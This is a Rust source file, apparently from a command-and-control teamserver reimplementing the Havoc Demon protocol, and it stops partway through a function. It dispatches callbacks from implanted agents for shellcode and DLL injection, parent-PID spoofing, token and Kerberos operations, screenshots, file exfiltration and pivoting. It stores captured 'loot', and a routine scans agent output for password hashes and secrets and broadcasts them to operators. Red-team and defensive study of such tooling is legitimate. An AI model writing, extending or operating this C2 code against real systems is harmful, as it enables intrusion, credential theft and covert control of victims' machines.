//! Command routing for parsed Demon callback packages.

use std::collections::BTreeMap;
use std::collections::HashMap;
use std::future::Future;
use std::pin::Pin;
use std::sync::Arc;

use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage, DemonProtocolError};
use red_cell_common::operator::{
    AgentResponseInfo, EventCode, Message, MessageHead, OperatorMessage,
};
use serde_json::Value;
use thiserror::Error;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::sync::RwLock;
use tracing::warn;

use crate::{
    AgentRegistry, Database, DemonCallbackPackage, EventBus, LootRecord, PluginRuntime,
    SocketRelayManager, TeamserverError,
};

mod assembly;
mod checkin;
mod filesystem;
mod kerberos;
mod network;
mod output;
mod pivot;
mod process;
mod screenshot;
mod socket;
mod token;
mod transfer;
pub(crate) mod util;

type HandlerFuture =
    Pin<Box<dyn Future<Output = Result<Option<Vec<u8>>, CommandDispatchError>> + Send>>;
type Handler = dyn Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static;

use crate::DEFAULT_MAX_DOWNLOAD_BYTES;
const DOWNLOAD_TRACKER_AGGREGATE_CAP_MULTIPLIER: usize = 4;
const DOTNET_INFO_PATCHED: u32 = 0x1;
const DOTNET_INFO_NET_VERSION: u32 = 0x2;
const DOTNET_INFO_ENTRYPOINT_EXECUTED: u32 = 0x3;
const DOTNET_INFO_FINISHED: u32 = 0x4;
const DOTNET_INFO_FAILED: u32 = 0x5;

#[derive(Clone, Debug)]
pub(crate) struct DownloadTracker {
    max_download_bytes: usize,
    max_total_download_bytes: usize,
    inner: Arc<RwLock<DownloadTrackerState>>,
}

#[derive(Debug, Default)]
struct DownloadTrackerState {
    downloads: HashMap<(u32, u32), TrackedDownload>,
    total_buffered_bytes: usize,
}

#[derive(Clone, Debug)]
struct TrackedDownload {
    state: DownloadState,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct DownloadState {
    request_id: u32,
    remote_path: String,
    expected_size: u64,
    data: Vec<u8>,
    started_at: String,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
struct LootContext {
    operator: String,
    command_line: String,
    task_id: String,
    queued_at: String,
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct CredentialCapture {
    label: String,
    content: String,
    pattern: &'static str,
}

#[derive(Clone, Debug)]
struct AgentResponseEntry {
    agent_id: u32,
    command_id: u32,
    request_id: u32,
    kind: String,
    message: String,
    extra: BTreeMap<String, Value>,
    output: String,
}

#[derive(Clone, Copy)]
struct BuiltinDispatchContext<'a> {
    registry: &'a AgentRegistry,
    events: &'a EventBus,
    database: &'a Database,
    sockets: &'a SocketRelayManager,
    downloads: &'a DownloadTracker,
    plugins: Option<&'a PluginRuntime>,
}

#[derive(Clone)]
struct BuiltinHandlerDependencies {
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    downloads: DownloadTracker,
    plugins: Option<PluginRuntime>,
}

/// Error returned while routing or executing a Demon command handler.
#[derive(Debug, Error)]
pub enum CommandDispatchError {
    /// The dispatcher could not update shared teamserver state.
    #[error("{0}")]
    Registry(#[from] TeamserverError),
    /// A handler failed to serialize its response in Havoc's package format.
    #[error("failed to serialize demon response: {0}")]
    Protocol(#[from] DemonProtocolError),
    /// The dispatcher could not format a callback timestamp.
    #[error("failed to format callback timestamp: {0}")]
    Timestamp(#[from] time::error::Format),
    /// A callback payload could not be parsed according to the Havoc wire format.
    #[error("failed to parse callback payload for command 0x{command_id:08X}: {message}")]
    InvalidCallbackPayload {
        /// Raw command identifier associated with the callback.
        command_id: u32,
        /// Human-readable parser error.
        message: String,
    },
    /// A download exceeded the configured in-memory accumulation cap and was dropped.
    #[error(
        "download 0x{file_id:08X} for agent 0x{agent_id:08X} exceeded max_download_bytes ({max_download_bytes} bytes)"
    )]
    DownloadTooLarge {
        /// Agent owning the dropped download.
        agent_id: u32,
        /// File identifier associated with the dropped download.
        file_id: u32,
        /// Configured maximum number of bytes allowed in memory for a single download.
        max_download_bytes: usize,
    },
    /// Active partial downloads exceeded the configured aggregate in-memory cap and one was dropped.
    #[error(
        "active downloads for agent 0x{agent_id:08X} exceeded aggregate max_download_bytes ({max_total_download_bytes} bytes) while tracking file 0x{file_id:08X}"
    )]
    DownloadAggregateTooLarge {
        /// Agent owning the dropped download.
        agent_id: u32,
        /// File identifier associated with the dropped download.
        file_id: u32,
        /// Configured maximum number of bytes allowed in memory across all active downloads.
        max_total_download_bytes: usize,
    },
}

/// Central registry of Demon command handlers keyed by command identifier.
#[derive(Clone)]
pub struct CommandDispatcher {
    handlers: Arc<HashMap<u32, Arc<Handler>>>,
    downloads: DownloadTracker,
}

impl std::fmt::Debug for CommandDispatcher {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut commands = self.handlers.keys().copied().collect::<Vec<_>>();
        commands.sort_unstable();
        formatter.debug_struct("CommandDispatcher").field("registered_commands", &commands).finish()
    }
}

impl Default for CommandDispatcher {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandDispatcher {
    /// Create an empty dispatcher with no registered handlers.
    #[must_use]
    pub fn new() -> Self {
        Self {
            handlers: Arc::new(HashMap::new()),
            downloads: DownloadTracker::from_max_download_bytes(DEFAULT_MAX_DOWNLOAD_BYTES),
        }
    }

    #[must_use]
    fn with_max_download_bytes(max_download_bytes: usize) -> Self {
        Self {
            handlers: Arc::new(HashMap::new()),
            downloads: DownloadTracker::new(max_download_bytes),
        }
    }

    fn register_builtin_handlers(
        &mut self,
        dependencies: BuiltinHandlerDependencies,
        include_get_job: bool,
    ) {
        let BuiltinHandlerDependencies { registry, events, database, sockets, downloads, plugins } =
            dependencies;

        if include_get_job {
            let get_job_registry = registry.clone();
            self.register_handler(u32::from(DemonCommand::CommandGetJob), move |agent_id, _, _| {
                let registry = get_job_registry.clone();
                Box::pin(async move { handle_get_job(&registry, agent_id).await })
            });
        }

        let checkin_registry = registry.clone();
        let checkin_events = events.clone();
        let checkin_database = database.clone();
        let checkin_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandCheckin),
            move |agent_id, _, payload| {
                let registry = checkin_registry.clone();
                let events = checkin_events.clone();
                let database = checkin_database.clone();
                let plugins = checkin_plugins.clone();
                Box::pin(async move {
                    checkin::handle_checkin(
                        &registry,
                        &events,
                        &database,
                        plugins.as_ref(),
                        agent_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let proc_list_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProcList),
            move |agent_id, request_id, payload| {
                let events = proc_list_events.clone();
                Box::pin(async move {
                    process::handle_process_list_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let sleep_registry = registry.clone();
        let sleep_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSleep),
            move |agent_id, request_id, payload| {
                let registry = sleep_registry.clone();
                let events = sleep_events.clone();
                Box::pin(async move {
                    output::handle_sleep_callback(
                        &registry, &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let fs_database = database.clone();
        let fs_events = events.clone();
        let fs_downloads = downloads.clone();
        let fs_registry = registry.clone();
        let fs_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandFs),
            move |agent_id, request_id, payload| {
                let registry = fs_registry.clone();
                let database = fs_database.clone();
                let events = fs_events.clone();
                let downloads = fs_downloads.clone();
                let plugins = fs_plugins.clone();
                Box::pin(async move {
                    filesystem::handle_filesystem_callback(
                        &registry,
                        &database,
                        &events,
                        &downloads,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let proc_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProc),
            move |agent_id, request_id, payload| {
                let events = proc_events.clone();
                Box::pin(async move {
                    process::handle_process_command_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let proc_ppid_registry = registry.clone();
        let proc_ppid_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandProcPpidSpoof),
            move |agent_id, request_id, payload| {
                let registry = proc_ppid_registry.clone();
                let events = proc_ppid_events.clone();
                Box::pin(async move {
                    process::handle_proc_ppid_spoof_callback(
                        &registry, &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let inject_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandInjectShellcode),
            move |agent_id, request_id, payload| {
                let events = inject_events.clone();
                Box::pin(async move {
                    process::handle_inject_shellcode_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let inject_dll_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandInjectDll),
            move |agent_id, request_id, payload| {
                let events = inject_dll_events.clone();
                Box::pin(async move {
                    process::handle_inject_dll_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let spawn_dll_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSpawnDll),
            move |agent_id, request_id, payload| {
                let events = spawn_dll_events.clone();
                Box::pin(async move {
                    process::handle_spawn_dll_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let command_output_events = events.clone();
        let command_output_plugins = plugins.clone();
        let command_output_database = database.clone();
        let command_output_registry = registry.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandOutput),
            move |agent_id, request_id, payload| {
                let registry = command_output_registry.clone();
                let database = command_output_database.clone();
                let events = command_output_events.clone();
                let plugins = command_output_plugins.clone();
                Box::pin(async move {
                    output::handle_command_output_callback(
                        &registry,
                        &database,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let error_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandError),
            move |agent_id, request_id, payload| {
                let events = error_events.clone();
                Box::pin(async move {
                    output::handle_command_error_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let exit_registry = registry.clone();
        let exit_sockets = sockets.clone();
        let exit_events = events.clone();
        let exit_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandExit),
            move |agent_id, request_id, payload| {
                let registry = exit_registry.clone();
                let sockets = exit_sockets.clone();
                let events = exit_events.clone();
                let plugins = exit_plugins.clone();
                Box::pin(async move {
                    output::handle_exit_callback(
                        &registry,
                        &sockets,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let kill_date_registry = registry.clone();
        let kill_date_sockets = sockets.clone();
        let kill_date_events = events.clone();
        let kill_date_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandKillDate),
            move |agent_id, request_id, payload| {
                let registry = kill_date_registry.clone();
                let sockets = kill_date_sockets.clone();
                let events = kill_date_events.clone();
                let plugins = kill_date_plugins.clone();
                Box::pin(async move {
                    output::handle_kill_date_callback(
                        &registry,
                        &sockets,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let info_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::DemonInfo),
            move |agent_id, request_id, payload| {
                let events = info_events.clone();
                Box::pin(async move {
                    output::handle_demon_info_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let beacon_database = database.clone();
        let beacon_events = events.clone();
        let beacon_downloads = downloads.clone();
        let beacon_registry = registry.clone();
        let beacon_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::BeaconOutput),
            move |agent_id, request_id, payload| {
                let registry = beacon_registry.clone();
                let database = beacon_database.clone();
                let events = beacon_events.clone();
                let downloads = beacon_downloads.clone();
                let plugins = beacon_plugins.clone();
                Box::pin(async move {
                    transfer::handle_beacon_output_callback(
                        &registry,
                        &database,
                        &events,
                        &downloads,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let token_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandToken),
            move |agent_id, request_id, payload| {
                let events = token_events.clone();
                Box::pin(async move {
                    token::handle_token_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let inline_execute_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandInlineExecute),
            move |agent_id, request_id, payload| {
                let events = inline_execute_events.clone();
                Box::pin(async move {
                    assembly::handle_inline_execute_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let assembly_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandAssemblyInlineExecute),
            move |agent_id, request_id, payload| {
                let events = assembly_events.clone();
                Box::pin(async move {
                    assembly::handle_assembly_inline_execute_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let assembly_versions_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandAssemblyListVersions),
            move |agent_id, request_id, payload| {
                let events = assembly_versions_events.clone();
                Box::pin(async move {
                    assembly::handle_assembly_list_versions_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let job_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandJob),
            move |agent_id, request_id, payload| {
                let events = job_events.clone();
                Box::pin(async move {
                    output::handle_job_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let net_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandNet),
            move |agent_id, request_id, payload| {
                let events = net_events.clone();
                Box::pin(async move {
                    network::handle_net_callback(&events, agent_id, request_id, &payload).await
                })
            },
        );

        let config_registry = registry.clone();
        let config_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandConfig),
            move |agent_id, request_id, payload| {
                let registry = config_registry.clone();
                let events = config_events.clone();
                Box::pin(async move {
                    output::handle_config_callback(
                        &registry, &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let screenshot_database = database.clone();
        let screenshot_events = events.clone();
        let screenshot_registry = registry.clone();
        let screenshot_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandScreenshot),
            move |agent_id, request_id, payload| {
                let registry = screenshot_registry.clone();
                let database = screenshot_database.clone();
                let events = screenshot_events.clone();
                let plugins = screenshot_plugins.clone();
                Box::pin(async move {
                    screenshot::handle_screenshot_callback(
                        &registry,
                        &database,
                        &events,
                        plugins.as_ref(),
                        agent_id,
                        request_id,
                        &payload,
                    )
                    .await
                })
            },
        );

        let transfer_events = events.clone();
        let transfer_downloads = downloads.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandTransfer),
            move |agent_id, request_id, payload| {
                let events = transfer_events.clone();
                let downloads = transfer_downloads.clone();
                Box::pin(async move {
                    transfer::handle_transfer_callback(
                        &events, &downloads, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let kerberos_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandKerberos),
            move |agent_id, request_id, payload| {
                let events = kerberos_events.clone();
                Box::pin(async move {
                    kerberos::handle_kerberos_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let mem_file_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandMemFile),
            move |agent_id, request_id, payload| {
                let events = mem_file_events.clone();
                Box::pin(async move {
                    transfer::handle_mem_file_callback(&events, agent_id, request_id, &payload)
                        .await
                })
            },
        );

        let package_dropped_events = events.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandPackageDropped),
            move |agent_id, request_id, payload| {
                let events = package_dropped_events.clone();
                Box::pin(async move {
                    transfer::handle_package_dropped_callback(
                        &events, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let socket_events = events.clone();
        let socket_manager = sockets.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandSocket),
            move |agent_id, request_id, payload| {
                let events = socket_events.clone();
                let sockets = socket_manager.clone();
                Box::pin(async move {
                    socket::handle_socket_callback(
                        &events, &sockets, agent_id, request_id, &payload,
                    )
                    .await
                })
            },
        );

        let pivot_registry = registry.clone();
        let pivot_events = events.clone();
        let pivot_database = database.clone();
        let pivot_sockets = sockets.clone();
        let pivot_downloads = downloads.clone();
        let pivot_plugins = plugins.clone();
        self.register_handler(
            u32::from(DemonCommand::CommandPivot),
            move |agent_id, request_id, payload| {
                let registry = pivot_registry.clone();
                let events = pivot_events.clone();
                let database = pivot_database.clone();
                let sockets = pivot_sockets.clone();
                let downloads = pivot_downloads.clone();
                let plugins = pivot_plugins.clone();
                Box::pin(async move {
                    let context = BuiltinDispatchContext {
                        registry: &registry,
                        events: &events,
                        database: &database,
                        sockets: &sockets,
                        downloads: &downloads,
                        plugins: plugins.as_ref(),
                    };
                    pivot::handle_pivot_callback(context, agent_id, request_id, &payload).await
                })
            },
        );
    }

    /// Create a dispatcher with the built-in Demon command handlers.
    #[must_use]
    pub fn with_builtin_handlers(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
    ) -> Self {
        Self::with_builtin_handlers_and_max_download_bytes(
            registry,
            events,
            database,
            sockets,
            plugins,
            DEFAULT_MAX_DOWNLOAD_BYTES,
        )
    }

    /// Create a dispatcher with the built-in Demon command handlers and a custom download cap.
    #[must_use]
    pub fn with_builtin_handlers_and_max_download_bytes(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        max_download_bytes: u64,
    ) -> Self {
        Self::with_builtin_handlers_and_downloads(
            registry,
            events,
            database,
            sockets,
            plugins,
            DownloadTracker::from_max_download_bytes(max_download_bytes),
        )
    }

    pub(crate) fn with_builtin_handlers_and_downloads(
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
    ) -> Self {
        let mut dispatcher = Self::with_downloads(downloads);
        dispatcher.register_builtin_handlers(
            BuiltinHandlerDependencies {
                registry,
                events,
                database,
                sockets,
                downloads: dispatcher.downloads.clone(),
                plugins,
            },
            true,
        );

        dispatcher
    }

    fn with_downloads(downloads: DownloadTracker) -> Self {
        Self { handlers: Arc::new(HashMap::new()), downloads }
    }

    /// Register or replace a handler for a raw Demon command identifier.
    pub fn register_handler<F>(&mut self, command_id: u32, handler: F)
    where
        F: Fn(u32, u32, Vec<u8>) -> HandlerFuture + Send + Sync + 'static,
    {
        Arc::make_mut(&mut self.handlers).insert(command_id, Arc::new(handler));
    }

    /// Return `true` when a handler is registered for `command_id`.
    #[must_use]
    pub fn handles_command(&self, command_id: u32) -> bool {
        self.handlers.contains_key(&command_id)
    }

    /// Dispatch a single parsed callback package.
    pub async fn dispatch(
        &self,
        agent_id: u32,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Option<Vec<u8>>, CommandDispatchError> {
        let Some(handler) = self.handlers.get(&command_id).cloned() else {
            return Ok(None);
        };

        handler(agent_id, request_id, payload.to_vec()).await
    }

    /// Dispatch multiple parsed callback packages and concatenate any response packages.
    pub async fn dispatch_packages(
        &self,
        agent_id: u32,
        packages: &[DemonCallbackPackage],
    ) -> Result<Vec<u8>, CommandDispatchError> {
        self.collect_response_bytes(agent_id, packages).await
    }

    async fn collect_response_bytes(
        &self,
        agent_id: u32,
        packages: &[DemonCallbackPackage],
    ) -> Result<Vec<u8>, CommandDispatchError> {
        let mut response = Vec::new();

        for package in packages {
            if let Some(bytes) = self
                .dispatch(agent_id, package.command_id, package.request_id, &package.payload)
                .await?
            {
                response.extend_from_slice(&bytes);
            }
        }

        Ok(response)
    }
}

async fn handle_get_job(
    registry: &AgentRegistry,
    agent_id: u32,
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let jobs = registry.dequeue_jobs(agent_id).await?;
    if jobs.is_empty() {
        return Ok(None);
    }

    let mut packages = Vec::with_capacity(jobs.len());

    for job in jobs {
        let payload = if job.payload.is_empty() {
            Vec::new()
        } else {
            registry.encrypt_for_agent(agent_id, &job.payload).await?
        };
        packages.push(DemonPackage {
            command_id: job.command,
            request_id: job.request_id,
            payload,
        });
    }

    Ok(Some(DemonMessage::new(packages).to_bytes()?))
}

impl DownloadTracker {
    pub(crate) fn new(max_download_bytes: usize) -> Self {
        let max_total_download_bytes = max_download_bytes
            .saturating_mul(DOWNLOAD_TRACKER_AGGREGATE_CAP_MULTIPLIER)
            .max(max_download_bytes);
        Self::with_limits(max_download_bytes, max_total_download_bytes)
    }

    pub(crate) fn from_max_download_bytes(max_download_bytes: u64) -> Self {
        let max_download_bytes = match usize::try_from(max_download_bytes) {
            Ok(value) => value,
            Err(_) => usize::MAX,
        };
        Self::new(max_download_bytes)
    }

    fn with_limits(max_download_bytes: usize, max_total_download_bytes: usize) -> Self {
        Self {
            max_download_bytes,
            max_total_download_bytes: max_total_download_bytes.max(max_download_bytes),
            inner: Arc::new(RwLock::new(DownloadTrackerState::default())),
        }
    }

    async fn start(&self, agent_id: u32, file_id: u32, state: DownloadState) {
        let mut tracker = self.inner.write().await;
        self.remove_locked(&mut tracker, agent_id, file_id);
        tracker.downloads.insert((agent_id, file_id), TrackedDownload { state });
    }

    async fn append(
        &self,
        agent_id: u32,
        file_id: u32,
        chunk: &[u8],
    ) -> Result<DownloadState, CommandDispatchError> {
        let mut tracker = self.inner.write().await;
        let Some(current_len) =
            tracker.downloads.get(&(agent_id, file_id)).map(|download| download.state.data.len())
        else {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::BeaconOutput),
                message: format!("download 0x{file_id:08X} was not opened"),
            });
        };
        let Some(next_len) = current_len.checked_add(chunk.len()) else {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadTooLarge {
                agent_id,
                file_id,
                max_download_bytes: self.max_download_bytes,
            });
        };
        if next_len > self.max_download_bytes {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadTooLarge {
                agent_id,
                file_id,
                max_download_bytes: self.max_download_bytes,
            });
        }
        let Some(next_total) = tracker.total_buffered_bytes.checked_add(chunk.len()) else {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadAggregateTooLarge {
                agent_id,
                file_id,
                max_total_download_bytes: self.max_total_download_bytes,
            });
        };
        if next_total > self.max_total_download_bytes {
            self.remove_locked(&mut tracker, agent_id, file_id);
            return Err(CommandDispatchError::DownloadAggregateTooLarge {
                agent_id,
                file_id,
                max_total_download_bytes: self.max_total_download_bytes,
            });
        }
        let Some(download) = tracker.downloads.get_mut(&(agent_id, file_id)) else {
            return Err(CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::BeaconOutput),
                message: format!("download 0x{file_id:08X} was not opened"),
            });
        };
        download.state.data.extend_from_slice(chunk);
        let updated = download.state.clone();
        let _ = download;
        tracker.total_buffered_bytes = next_total;
        Ok(updated)
    }

    async fn finish(&self, agent_id: u32, file_id: u32) -> Option<DownloadState> {
        let mut tracker = self.inner.write().await;
        self.remove_locked(&mut tracker, agent_id, file_id)
    }

    pub(crate) async fn drain_agent(&self, agent_id: u32) -> usize {
        let mut tracker = self.inner.write().await;
        let file_ids = tracker
            .downloads
            .keys()
            .filter_map(|(download_agent_id, file_id)| {
                (*download_agent_id == agent_id).then_some(*file_id)
            })
            .collect::<Vec<_>>();

        let mut removed = 0;
        for file_id in file_ids {
            if self.remove_locked(&mut tracker, agent_id, file_id).is_some() {
                removed += 1;
            }
        }

        removed
    }

    async fn active_for_agent(&self, agent_id: u32) -> Vec<(u32, DownloadState)> {
        let tracker = self.inner.read().await;
        let mut downloads = tracker
            .downloads
            .iter()
            .filter_map(|((download_agent_id, file_id), download)| {
                (*download_agent_id == agent_id).then_some((*file_id, download.state.clone()))
            })
            .collect::<Vec<_>>();
        downloads.sort_by_key(|(file_id, _)| *file_id);
        downloads
    }

    fn remove_locked(
        &self,
        tracker: &mut DownloadTrackerState,
        agent_id: u32,
        file_id: u32,
    ) -> Option<DownloadState> {
        let removed = tracker.downloads.remove(&(agent_id, file_id))?;
        tracker.total_buffered_bytes =
            tracker.total_buffered_bytes.saturating_sub(removed.state.data.len());
        Some(removed.state)
    }

    #[cfg(test)]
    async fn buffered_bytes(&self) -> usize {
        self.inner.read().await.total_buffered_bytes
    }
}

async fn loot_context(registry: &AgentRegistry, agent_id: u32, request_id: u32) -> LootContext {
    registry
        .request_context(agent_id, request_id)
        .await
        .map(|context| LootContext {
            operator: context.operator,
            command_line: context.command_line,
            task_id: context.task_id,
            queued_at: context.created_at,
        })
        .unwrap_or_default()
}

async fn insert_loot_record(
    database: &Database,
    loot: LootRecord,
) -> Result<LootRecord, CommandDispatchError> {
    let id = database.loot().create(&loot).await?;
    Ok(LootRecord { id: Some(id), ..loot })
}

async fn persist_agent_response_record(
    database: &Database,
    response: &AgentResponseEntry,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let final_extra = agent_response_extra(
        response.extra.clone(),
        response.request_id,
        &response.kind,
        &response.message,
        context,
    );
    database
        .agent_responses()
        .create(&crate::AgentResponseRecord {
            id: None,
            agent_id: response.agent_id,
            command_id: response.command_id,
            request_id: response.request_id,
            response_type: response.kind.clone(),
            message: response.message.clone(),
            output: response.output.clone(),
            command_line: non_empty_option(&context.command_line),
            task_id: non_empty_option(&context.task_id),
            operator: non_empty_option(&context.operator),
            received_at: timestamp,
            extra: Some(Value::Object(final_extra.into_iter().collect())),
        })
        .await?;
    Ok(())
}

async fn broadcast_and_persist_agent_response(
    database: &Database,
    events: &EventBus,
    response: AgentResponseEntry,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    persist_agent_response_record(database, &response, context).await?;
    events.broadcast(agent_response_event_with_extra_and_context(
        response.agent_id,
        response.command_id,
        response.request_id,
        &response.kind,
        &response.message,
        response.extra,
        response.output,
        Some(context),
    )?);
    Ok(())
}

fn loot_new_event(
    loot: &LootRecord,
    command_id: u32,
    request_id: u32,
    context: &LootContext,
) -> Result<OperatorMessage, CommandDispatchError> {
    let mut extra = BTreeMap::from([
        ("MiscType".to_owned(), Value::String("loot-new".to_owned())),
        ("LootID".to_owned(), Value::String(loot.id.unwrap_or_default().to_string())),
        ("LootKind".to_owned(), Value::String(loot.kind.clone())),
        ("LootName".to_owned(), Value::String(loot.name.clone())),
        ("CapturedAt".to_owned(), Value::String(loot.captured_at.clone())),
    ]);

    if let Some(path) = &loot.file_path {
        extra.insert("FilePath".to_owned(), Value::String(path.clone()));
    }
    if let Some(size_bytes) = loot.size_bytes {
        extra.insert("SizeBytes".to_owned(), Value::String(size_bytes.to_string()));
    }
    if !context.operator.is_empty() {
        extra.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        extra.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        extra.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }

    agent_response_event_with_extra(
        loot.agent_id,
        command_id,
        request_id,
        "Info",
        &format!("New loot captured: {} ({})", loot.name, loot.kind),
        extra,
        String::new(),
    )
}

fn metadata_with_context(
    entries: impl IntoIterator<Item = (String, Value)>,
    context: &LootContext,
) -> Value {
    let mut metadata = serde_json::Map::new();
    for (key, value) in entries {
        metadata.insert(key, value);
    }
    if !context.operator.is_empty() {
        metadata.insert("operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        metadata.insert("command_line".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        metadata.insert("task_id".to_owned(), Value::String(context.task_id.clone()));
    }
    if !context.queued_at.is_empty() {
        metadata.insert("queued_at".to_owned(), Value::String(context.queued_at.clone()));
    }
    Value::Object(metadata)
}

fn broadcast_credential_event(
    events: &EventBus,
    agent_id: u32,
    credential: &CredentialCapture,
    context: &LootContext,
) -> Result<(), CommandDispatchError> {
    let timestamp = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let mut fields = BTreeMap::from([
        ("DemonID".to_owned(), Value::String(format!("{agent_id:08X}"))),
        ("Name".to_owned(), Value::String(credential.label.clone())),
        ("Credential".to_owned(), Value::String(credential.content.clone())),
        ("Pattern".to_owned(), Value::String(credential.pattern.to_owned())),
    ]);

    if !context.operator.is_empty() {
        fields.insert("Operator".to_owned(), Value::String(context.operator.clone()));
    }
    if !context.command_line.is_empty() {
        fields.insert("CommandLine".to_owned(), Value::String(context.command_line.clone()));
    }
    if !context.task_id.is_empty() {
        fields.insert("TaskID".to_owned(), Value::String(context.task_id.clone()));
    }

    events.broadcast(OperatorMessage::CredentialsAdd(Message {
        head: MessageHead {
            event: EventCode::Credentials,
            user: "teamserver".to_owned(),
            timestamp,
            one_time: String::new(),
        },
        info: red_cell_common::operator::FlatInfo { fields },
    }));
    Ok(())
}

fn extract_credentials(output: &str) -> Vec<CredentialCapture> {
    let mut captures = Vec::new();
    let mut current_block = Vec::new();

    for raw_line in output.lines() {
        let line = raw_line.trim();
        if line.is_empty() {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            continue;
        }

        if looks_like_pwdump_hash(line) {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
                    label: "credential-block".to_owned(),
                    content: current_block.join("\n"),
                    pattern: "keyword-block",
                });
                current_block.clear();
            }
            captures.push(CredentialCapture {
                label: "password-hash".to_owned(),
                content: line.to_owned(),
                pattern: "pwdump-hash",
            });
            continue;
        }

        if looks_like_inline_secret(line) {
            if !current_block.is_empty() {
                captures.push(CredentialCapture {
